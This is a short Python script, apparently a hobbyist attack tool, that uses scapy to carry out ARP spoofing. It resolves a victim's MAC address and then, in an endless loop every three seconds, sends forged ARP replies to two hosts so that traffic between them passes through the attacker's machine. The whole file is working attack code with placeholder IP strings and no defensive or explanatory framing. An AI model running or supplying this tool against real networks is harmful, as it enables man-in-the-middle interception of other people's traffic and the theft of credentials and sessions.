import scapy.all as scapy
import time

def get_mac_address(ip):

    arp_request_pack  = scapy.ARP(pdst=ip)

    broadcast_pack  = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    combined_packet = broadcast_pack / arp_request_pack

    answered_list  = scapy.srp(combined_packet, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc



def arp_poisining(target_ip,poisined_ip) :

    target_mac = get_mac_address(target_ip)

    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=poisined_ip)

    scapy.send(arp_response, verbose=False)


while True:

    arp_poisining("target_ip","poisined_ip")
    arp_poisining("poisined_ip","target_ip")
    print("\rSending Packets",end="")

    time.sleep(3)